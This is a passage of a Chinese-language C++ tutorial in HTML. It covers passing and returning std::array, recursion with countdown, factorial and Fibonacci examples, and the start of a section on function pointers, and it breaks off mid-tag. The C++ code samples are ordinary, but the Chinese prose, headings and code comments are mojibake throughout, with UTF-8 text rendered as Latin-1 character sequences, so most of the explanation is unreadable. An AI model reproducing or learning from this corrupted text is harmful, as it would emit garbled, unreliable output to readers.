<strong>æŒ‰å¸¸é‡å¼•ç”¨ (<code>const std::array&lt;T, N&gt;&amp; arr</code>)</strong>: ä¸åˆ›å»ºå‰¯æœ¬ï¼Œé«˜æ•ˆï¼Œä¸å…è®¸ä¿®æ”¹ã€‚<strong>è¿™æ˜¯å°† <code>array</code> ä¼ é€’ç»™å‡½æ•°è¿›è¡Œåªè¯»è®¿é—®çš„æœ€å¸¸ç”¨å’Œæ¨èçš„æ–¹å¼ã€‚</strong></li></ul><h3 id="è¿”å›-std-array-å¯¹è±¡"><a href="#è¿”å›-std-array-å¯¹è±¡" class="headerlink" title="è¿”å› std::array å¯¹è±¡"></a>è¿”å› <code>std::array</code> å¯¹è±¡</h3><p>å‡½æ•°ä¹Ÿå¯ä»¥è¿”å› <code>std::array</code> å¯¹è±¡ï¼Œé€šå¸¸æŒ‰å€¼è¿”å›ã€‚ä¸ <code>std::string</code> ç±»ä¼¼ï¼Œç¼–è¯‘å™¨é€šå¸¸ä¼šåº”ç”¨ RVO/NRVO æ¥ä¼˜åŒ–æ‰è¿”å›æ—¶çš„å¤åˆ¶æ“ä½œã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt; // for std::pow</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> ThreeInts = <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">int</span>, <span class="number">3</span>&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°ï¼šåˆ›å»ºä¸€ä¸ªåŒ…å« x, x^2, x^3 çš„ array å¹¶è¿”å›</span></span><br><span class="line"><span class="function">ThreeInts <span class="title">create_powers</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    ThreeInts result;</span><br><span class="line">    result[<span class="number">0</span>] = x;</span><br><span class="line">    result[<span class="number">1</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(<span class="built_in">std</span>::<span class="built_in">pow</span>(x, <span class="number">2</span>));</span><br><span class="line">    result[<span class="number">2</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(<span class="built_in">std</span>::<span class="built_in">pow</span>(x, <span class="number">3</span>));</span><br><span class="line">    <span class="keyword">return</span> result; <span class="comment">// è¿”å› array å¯¹è±¡ (é€šå¸¸ä¼šè¢«ä¼˜åŒ–)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ThreeInts powers_of_5 = create_powers(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Powers of 5: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> val : powers_of_5) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; val &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// è¾“å‡º: 5 25 125</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä¸ C é£æ ¼æ•°ç»„çš„æ¯”è¾ƒ:</strong></p><p>ä½¿ç”¨ <code>std::array</code> ä¸å‡½æ•°äº¤äº’æ¯”ä½¿ç”¨ C é£æ ¼æ•°ç»„æ›´ä¼˜è¶Šï¼š</p><ul><li>  <strong>å¤§å°æ˜¯ç±»å‹çš„ä¸€éƒ¨åˆ†:</strong> å‡½æ•°ç­¾åæ˜ç¡®æŒ‡å®šäº†æœŸæœ›çš„æ•°ç»„å¤§å°ï¼Œæé«˜äº†ç±»å‹å®‰å…¨ã€‚ä¾‹å¦‚ï¼Œä¸èƒ½å°† <code>std::array&lt;int, 5&gt;</code> ä¼ é€’ç»™æœŸæœ› <code>std::array&lt;int, 10&gt;</code> çš„å‡½æ•°ã€‚</li><li>  <strong>æ— æŒ‡é’ˆé€€åŒ–:</strong> <code>std::array</code> ä¸ä¼šé€€åŒ–ä¸ºæŒ‡é’ˆï¼Œé¿å…äº†ç›¸å…³çš„æ··æ·†å’Œé”™è¯¯ã€‚</li><li>  <strong>ä¼ é€’æ–¹å¼æ˜ç¡®:</strong> åƒæ™®é€šå¯¹è±¡ä¸€æ ·æŒ‰å€¼ã€æŒ‰å¼•ç”¨æˆ–æŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’ï¼Œè¯­ä¹‰æ¸…æ™°ã€‚</li><li>  <strong>æ¥å£æ›´ä¸°å¯Œ:</strong> å¯ä»¥ç›´æ¥åœ¨å‡½æ•°å†…éƒ¨ä½¿ç”¨ <code>size()</code>, <code>at()</code> ç­‰æˆå‘˜å‡½æ•°ã€‚</li></ul><p>å› æ­¤ï¼Œåœ¨éœ€è¦å›ºå®šå¤§å°æ•°ç»„çš„åœºæ™¯ä¸‹ï¼Œ<code>std::array</code> é€šå¸¸æ˜¯æ¯” C é£æ ¼æ•°ç»„æ›´å¥½çš„é€‰æ‹©ï¼Œå°¤å…¶æ˜¯åœ¨å‡½æ•°å‚æ•°å’Œè¿”å›å€¼ä¸­ä½¿ç”¨æ—¶ã€‚</p><h2 id="7-9-é€’å½’"><a href="#7-9-é€’å½’" class="headerlink" title="7.9 é€’å½’"></a>7.9 é€’å½’</h2><p><strong>é€’å½’ (Recursion)</strong> æ˜¯ä¸€ç§ç¼–ç¨‹æŠ€å·§ï¼Œå…¶ä¸­å‡½æ•°ç›´æ¥æˆ–é—´æ¥åœ°è°ƒç”¨è‡ªèº«æ¥è§£å†³é—®é¢˜ã€‚é€’å½’å‡½æ•°å°†ä¸€ä¸ªå¤§é—®é¢˜åˆ†è§£ä¸ºä¸€ä¸ªæˆ–å¤šä¸ªä¸åŸé—®é¢˜ç›¸ä¼¼ä½†è§„æ¨¡æ›´å°çš„å­é—®é¢˜ï¼Œç›´åˆ°é—®é¢˜è§„æ¨¡å°åˆ°å¯ä»¥ç›´æ¥è§£å†³ï¼ˆç§°ä¸º<strong>åŸºçº¿æ¡ä»¶</strong>æˆ–<strong>åŸºæœ¬æƒ…å†µ</strong>ï¼‰ã€‚</p><p>é€’å½’å‡½æ•°é€šå¸¸åŒ…å«ä¸¤ä¸ªå…³é”®éƒ¨åˆ†ï¼š</p><ol><li> <strong>åŸºçº¿æ¡ä»¶ (Base Case):</strong> ä¸€ä¸ªæˆ–å¤šä¸ªåœæ­¢é€’å½’çš„æ¡ä»¶ã€‚å½“æ»¡è¶³åŸºçº¿æ¡ä»¶æ—¶ï¼Œå‡½æ•°ä¸å†è°ƒç”¨è‡ªèº«ï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªç¡®å®šçš„å€¼æˆ–æ‰§è¡Œä¸€ä¸ªç®€å•çš„æ“ä½œã€‚æ²¡æœ‰åŸºçº¿æ¡ä»¶ä¼šå¯¼è‡´æ— é™é€’å½’ï¼Œæœ€ç»ˆè€—å°½å†…å­˜ï¼ˆæ ˆæº¢å‡ºï¼‰ã€‚</li><li> <strong>é€’å½’æ­¥éª¤ (Recursive Step):</strong> å‡½æ•°è°ƒç”¨è‡ªèº«ï¼Œä½†é€šå¸¸ä½¿ç”¨ä¿®æ”¹åçš„å‚æ•°ï¼Œä½¿å¾—é—®é¢˜è§„æ¨¡å‘åŸºçº¿æ¡ä»¶é è¿‘ã€‚</li></ol><h3 id="7-9-1-åŒ…å«ä¸€ä¸ªé€’å½’è°ƒç”¨çš„é€’å½’"><a href="#7-9-1-åŒ…å«ä¸€ä¸ªé€’å½’è°ƒç”¨çš„é€’å½’" class="headerlink" title="7.9.1 åŒ…å«ä¸€ä¸ªé€’å½’è°ƒç”¨çš„é€’å½’"></a>7.9.1 åŒ…å«ä¸€ä¸ªé€’å½’è°ƒç”¨çš„é€’å½’</h3><p>è¿™æ˜¯æœ€ç®€å•çš„é€’å½’å½¢å¼ï¼Œå‡½æ•°åœ¨æ¯æ¬¡æ‰§è¡Œæ—¶æœ€å¤šè°ƒç”¨è‡ªèº«ä¸€æ¬¡ã€‚</p><p><strong>ç¤ºä¾‹ï¼šä½¿ç”¨é€’å½’è¿›è¡Œå€’è®¡æ—¶</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// é€’å½’å‡½æ•°ï¼šä» n å€’æ•°åˆ° 1</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">countdown</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åŸºçº¿æ¡ä»¶ï¼šå½“ n å°äºç­‰äº 0 æ—¶ï¼Œåœæ­¢é€’å½’</span></span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Blastoff!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// é€’å½’æ­¥éª¤ï¼šæ‰“å°å½“å‰æ•°å­—ï¼Œç„¶åè°ƒç”¨è‡ªèº«å¤„ç† n-1</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; n &lt;&lt; <span class="string">&quot;...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        countdown(n - <span class="number">1</span>); <span class="comment">// å‡½æ•°è°ƒç”¨è‡ªèº«ï¼Œé—®é¢˜è§„æ¨¡å‡å° (n -&gt; n-1)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    countdown(<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡º:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5...</span><br><span class="line">4...</span><br><span class="line">3...</span><br><span class="line">2...</span><br><span class="line">1...</span><br><span class="line">Blastoff!</span><br></pre></td></tr></table></figure><p><strong>å·¥ä½œåŸç† (è°ƒç”¨æ ˆ):</strong></p><ol><li> <code>main</code> è°ƒç”¨ <code>countdown(5)</code>ã€‚</li><li> <code>countdown(5)</code> æ‰“å° â€œ5â€¦â€ï¼Œç„¶åè°ƒç”¨ <code>countdown(4)</code>ã€‚</li><li> <code>countdown(4)</code> æ‰“å° â€œ4â€¦â€ï¼Œç„¶åè°ƒç”¨ <code>countdown(3)</code>ã€‚</li><li> â€¦ è¿™ä¸ªè¿‡ç¨‹ç»§ç»­ â€¦</li><li> <code>countdown(1)</code> æ‰“å° â€œ1â€¦â€ï¼Œç„¶åè°ƒç”¨ <code>countdown(0)</code>ã€‚</li><li> <code>countdown(0)</code> æ»¡è¶³åŸºçº¿æ¡ä»¶ (<code>n &lt;= 0</code>)ï¼Œæ‰“å° â€œBlastoff!â€ å¹¶è¿”å›ã€‚</li><li> <code>countdown(1)</code> è¿”å›ã€‚</li><li> <code>countdown(2)</code> è¿”å›ã€‚</li><li> â€¦ ä¾æ¬¡å›æº¯ â€¦</li><li><code>countdown(5)</code> è¿”å›åˆ° <code>main</code>ã€‚</li></ol><p>æ¯æ¬¡å‡½æ•°è°ƒç”¨éƒ½ä¼šåœ¨ç§°ä¸ºâ€œè°ƒç”¨æ ˆâ€çš„å†…å­˜åŒºåŸŸä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„è®°å½•ï¼ˆæ ˆå¸§ï¼‰ï¼Œç”¨äºå­˜å‚¨å‡½æ•°çš„å±€éƒ¨å˜é‡å’Œè¿”å›åœ°å€ã€‚å½“å‡½æ•°è¿”å›æ—¶ï¼Œå…¶æ ˆå¸§è¢«ç§»é™¤ã€‚</p><p><strong>ç¤ºä¾‹ï¼šä½¿ç”¨é€’å½’è®¡ç®—é˜¶ä¹˜</strong></p><p>é˜¶ä¹˜ <code>n!</code> å®šä¹‰ä¸º <code>n * (n-1) * ... * 1</code>ï¼Œå¹¶ä¸” <code>0! = 1</code>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// é€’å½’å‡½æ•°ï¼šè®¡ç®— n çš„é˜¶ä¹˜</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">factorial</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åŸºçº¿æ¡ä»¶ï¼š0! = 1</span></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// é€’å½’æ­¥éª¤ï¼šn! = n * (n-1)!</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> n * factorial(n - <span class="number">1</span>); <span class="comment">// å‡½æ•°è°ƒç”¨è‡ªèº«</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num &lt;&lt; <span class="string">&quot;! = &quot;</span> &lt;&lt; factorial(num) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: 5! = 120</span></span><br><span class="line">    num = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num &lt;&lt; <span class="string">&quot;! = &quot;</span> &lt;&lt; factorial(num) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: 0! = 1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-9-2-åŒ…å«å¤šä¸ªé€’å½’è°ƒç”¨çš„é€’å½’"><a href="#7-9-2-åŒ…å«å¤šä¸ªé€’å½’è°ƒç”¨çš„é€’å½’" class="headerlink" title="7.9.2 åŒ…å«å¤šä¸ªé€’å½’è°ƒç”¨çš„é€’å½’"></a>7.9.2 åŒ…å«å¤šä¸ªé€’å½’è°ƒç”¨çš„é€’å½’</h3><p>åœ¨è¿™ç§å½¢å¼ä¸­ï¼Œå‡½æ•°åœ¨ä¸€æ¬¡æ‰§è¡Œä¸­å¯èƒ½ä¼šè°ƒç”¨è‡ªèº«å¤šæ¬¡ã€‚è¿™é€šå¸¸ç”¨äºè§£å†³å¯ä»¥åˆ†è§£ä¸ºå¤šä¸ªç›¸åŒç±»å‹å­é—®é¢˜çš„é—®é¢˜ï¼Œä¾‹å¦‚æ ‘çš„éå†æˆ–æŸäº›æ•°å­¦åºåˆ—çš„è®¡ç®—ã€‚</p><p><strong>ç¤ºä¾‹ï¼šä½¿ç”¨é€’å½’è®¡ç®—æ–æ³¢é‚£å¥‘æ•°åˆ—</strong></p><p>æ–æ³¢é‚£å¥‘æ•°åˆ—å®šä¹‰å¦‚ä¸‹ï¼š<code>F(0) = 0</code>, <code>F(1) = 1</code>, <code>F(n) = F(n-1) + F(n-2)</code> for <code>n &gt; 1</code>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// é€’å½’å‡½æ•°ï¼šè®¡ç®—ç¬¬ n ä¸ªæ–æ³¢é‚£å¥‘æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">fibonacci</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åŸºçº¿æ¡ä»¶</span></span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// é€’å½’æ­¥éª¤ï¼šF(n) = F(n-1) + F(n-2)</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// å‡½æ•°è°ƒç”¨è‡ªèº«ä¸¤æ¬¡</span></span><br><span class="line">        <span class="keyword">return</span> fibonacci(n - <span class="number">1</span>) + fibonacci(n - <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> term = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Fibonacci(&quot;</span> &lt;&lt; term &lt;&lt; <span class="string">&quot;) = &quot;</span> &lt;&lt; fibonacci(term) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: Fibonacci(10) = 55</span></span><br><span class="line"></span><br><span class="line">    term = <span class="number">6</span>;</span><br><span class="line">     <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Fibonacci(&quot;</span> &lt;&lt; term &lt;&lt; <span class="string">&quot;) = &quot;</span> &lt;&lt; fibonacci(term) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: Fibonacci(6) = 8</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å·¥ä½œåŸç†å’Œæ½œåœ¨é—®é¢˜:</strong></p><p>è®¡ç®— <code>fibonacci(5)</code> çš„è¿‡ç¨‹å¤§è‡´å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fibonacci(5)</span><br><span class="line">  -&gt; fibonacci(4) + fibonacci(3)</span><br><span class="line">       -&gt; (fibonacci(3) + fibonacci(2)) + (fibonacci(2) + fibonacci(1))</span><br><span class="line">            -&gt; ((fibonacci(2) + fibonacci(1)) + (fibonacci(1) + fibonacci(0))) + ((fibonacci(1) + fibonacci(0)) + 1)</span><br><span class="line">                 -&gt; (((fibonacci(1) + fibonacci(0)) + 1) + (1 + 0)) + ((1 + 0) + 1)</span><br><span class="line">                      -&gt; (((1 + 0) + 1) + (1 + 0)) + ((1 + 0) + 1)</span><br><span class="line">                      -&gt; ((1 + 1) + 1) + (1 + 1)</span><br><span class="line">                      -&gt; (2 + 1) + 2</span><br><span class="line">                      -&gt; 3 + 2</span><br><span class="line">                      -&gt; 5</span><br></pre></td></tr></table></figure><p>(æ³¨æ„ï¼šå®é™…è®¡ç®— <code>fibonacci(10)</code> ä¼šæ¶‰åŠæ›´å¤šå±‚è°ƒç”¨)</p><p>è¿™ç§åŒ…å«å¤šä¸ªé€’å½’è°ƒç”¨çš„å®ç°æ–¹å¼ï¼ˆå¦‚æ­¤å¤„çš„æ–æ³¢é‚£å¥‘ï¼‰è™½ç„¶ç›´è§‚åœ°åæ˜ äº†æ•°å­¦å®šä¹‰ï¼Œä½†æ•ˆç‡å¯èƒ½éå¸¸ä½ã€‚ä¾‹å¦‚ï¼Œåœ¨è®¡ç®— <code>fibonacci(5)</code> æ—¶ï¼Œ<code>fibonacci(3)</code> è¢«è®¡ç®—äº†ä¸¤æ¬¡ï¼Œ<code>fibonacci(2)</code> è¢«è®¡ç®—äº†ä¸‰æ¬¡ã€‚éšç€ <code>n</code> çš„å¢å¤§ï¼Œé‡å¤è®¡ç®—çš„æ¬¡æ•°å‘ˆæŒ‡æ•°çº§å¢é•¿ã€‚</p><p>å¯¹äºè¿™ç±»é—®é¢˜ï¼Œ<strong>è¿­ä»£</strong>ï¼ˆä½¿ç”¨å¾ªç¯ï¼‰æˆ–å…¶ä»–ä¼˜åŒ–æŠ€æœ¯ï¼ˆå¦‚<strong>è®°å¿†åŒ–</strong>ï¼Œå³å­˜å‚¨å·²è®¡ç®—çš„ç»“æœï¼‰é€šå¸¸æ˜¯æ›´é«˜æ•ˆçš„è§£å†³æ–¹æ¡ˆã€‚</p><p><strong>é€’å½’çš„ä¼˜ç¼ºç‚¹:</strong></p><ul><li><strong>ä¼˜ç‚¹:</strong><ul><li>  å¯¹äºæŸäº›é—®é¢˜ï¼ˆå¦‚æ ‘éå†ã€åˆ†æ²»ç®—æ³•ï¼‰ï¼Œé€’å½’å¯ä»¥æä¾›éå¸¸è‡ªç„¶ã€ç®€æ´å’Œæ˜“äºç†è§£çš„è§£å†³æ–¹æ¡ˆã€‚</li><li>  ä»£ç å¯ä»¥æ›´æ¥è¿‘é—®é¢˜çš„æ•°å­¦æˆ–é€»è¾‘æè¿°ã€‚</li></ul></li><li><strong>ç¼ºç‚¹:</strong><ul><li>  å¯èƒ½æ•ˆç‡ä½ä¸‹ï¼Œç‰¹åˆ«æ˜¯å½“å­˜åœ¨å¤§é‡é‡å¤è®¡ç®—æˆ–æ·±åº¦é€’å½’æ—¶ã€‚</li><li>  æ¯æ¬¡å‡½æ•°è°ƒç”¨éƒ½æœ‰å¼€é”€ï¼ˆåˆ›å»ºæ ˆå¸§ï¼‰ï¼Œå¯èƒ½å¯¼è‡´æ€§èƒ½é—®é¢˜ã€‚</li><li>  æ·±åº¦é€’å½’å¯èƒ½è€—å°½è°ƒç”¨æ ˆç©ºé—´ï¼Œå¯¼è‡´æ ˆæº¢å‡ºé”™è¯¯ã€‚</li><li>  è°ƒè¯•é€’å½’å‡½æ•°å¯èƒ½æ¯”è°ƒè¯•è¿­ä»£å‡½æ•°æ›´å›°éš¾ã€‚</li></ul></li></ul><p>åœ¨é€‰æ‹©ä½¿ç”¨é€’å½’è¿˜æ˜¯è¿­ä»£æ—¶ï¼Œéœ€è¦æƒè¡¡ä»£ç çš„æ¸…æ™°åº¦ã€ç®€æ´æ€§ä¸æ½œåœ¨çš„æ€§èƒ½å’Œå†…å­˜æ¶ˆè€—ã€‚</p><h2 id="7-10-å‡½æ•°æŒ‡é’ˆ"><a href="#7-10-å‡½æ•°æŒ‡é’ˆ" class="headerlink" title="7.10 å‡½æ•°æŒ‡é’ˆ"></a>7.10 å‡½æ•°æŒ‡é’ˆ</h2><p>å°±åƒå˜é‡æœ‰åœ°å€ï¼Œå‡½æ•°ä¹Ÿæœ‰åœ°å€ã€‚<strong>å‡½æ•°æŒ‡é’ˆ (Function Pointer)</strong> å°±æ˜¯ä¸€ä¸ªæŒ‡å‘å‡½æ•°å†…å­˜åœ°å€çš„æŒ‡é’ˆå˜é‡ã€‚é€šè¿‡å‡½æ•°æŒ‡é’ˆï¼Œæˆ‘ä»¬å¯ä»¥åƒè°ƒç”¨æ™®é€šå‡½æ•°ä¸€æ ·è°ƒç”¨å®ƒæ‰€æŒ‡å‘çš„å‡½æ•°ã€‚å‡½æ•°æŒ‡é’ˆçš„ä¸»è¦ç”¨é€”åŒ…æ‹¬ï¼š</p><ul><li>  å°†å‡½æ•°ä½œä¸ºå‚æ•°ä¼ é€’ç»™å…¶ä»–å‡½æ•°ï¼ˆä¾‹å¦‚ï¼Œå®ç°å›è°ƒæœºåˆ¶æˆ–ç­–ç•¥æ¨¡å¼ï¼‰ã€‚</li><li>  åœ¨è¿è¡Œæ—¶å†³å®šè°ƒç”¨å“ªä¸ªå‡½æ•°ã€‚</li><li>  æ„å»ºå‡½æ•°è¡¨æˆ–è°ƒåº¦è¡¨ã€‚</li></ul><h3 id="7-10-1-å‡½æ•°æŒ‡é’ˆçš„åŸºç¡€çŸ¥è¯†"><a href="#7-10-1-å‡½æ•°æŒ‡é’ˆçš„åŸºç¡€çŸ¥è¯†" class="headerlink" title="7.10.1 å‡½æ•°æŒ‡é’ˆçš„åŸºç¡€çŸ¥è¯†"></a>7.10.1 å‡½æ•°æŒ‡é’ˆçš„åŸºç¡€çŸ¥è¯†</h3><p><strong>å£°æ˜å‡½æ•°æŒ‡é’ˆ:</strong></p><p>å£°æ˜å‡½æ•°æŒ‡é’ˆæ—¶ï¼Œå¿…é¡»æŒ‡å®šå®ƒæ‰€æŒ‡å‘çš„å‡½æ•°çš„<strong>è¿”å›ç±»å‹</strong>å’Œ<strong>å‚æ•°åˆ—è¡¨ç±»å‹</strong>ã€‚è¿™ç¡®ä¿äº†ç±»å‹å®‰å…¨ï¼Œå³å‡½æ•°æŒ‡é’ˆåªèƒ½æŒ‡å‘å…·æœ‰åŒ¹é…ç­¾åçš„å‡½æ•°ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return_type (*pointer_name)(parameter_type_list);</span><br></pre></td></tr></table></figure><ul><li>  <code>return_type</code>: å‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°çš„è¿”å›ç±»å‹ã€‚</li><li>  <code>pointer_name</code>: å‡½æ•°æŒ‡é’ˆå˜é‡çš„åç§°ã€‚</li><li>  <code>parameter_type_list</code>: å‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°çš„å‚æ•°ç±»å‹åˆ—è¡¨ï¼Œç”¨é€—å·åˆ†éš”ã€‚</li><li>  <code>(*pointer_name)</code>: æ‹¬å·æ˜¯å¿…éœ€çš„ï¼Œå®ƒè¡¨æ˜ <code>pointer_name</code> æ˜¯ä¸€ä¸ªæŒ‡é’ˆã€‚å¦‚æœæ²¡æœ‰æ‹¬å·ï¼Œ<code>return_type *pointer_name(parameter_type_list);</code> ä¼šè¢«è§£é‡Šä¸ºä¸€ä¸ªè¿”å› <code>return_type*</code> ç±»å‹çš„å‡½æ•°å£°æ˜ã€‚</li></ul><p><strong>ç¤ºä¾‹å£°æ˜:</strong></p><figure 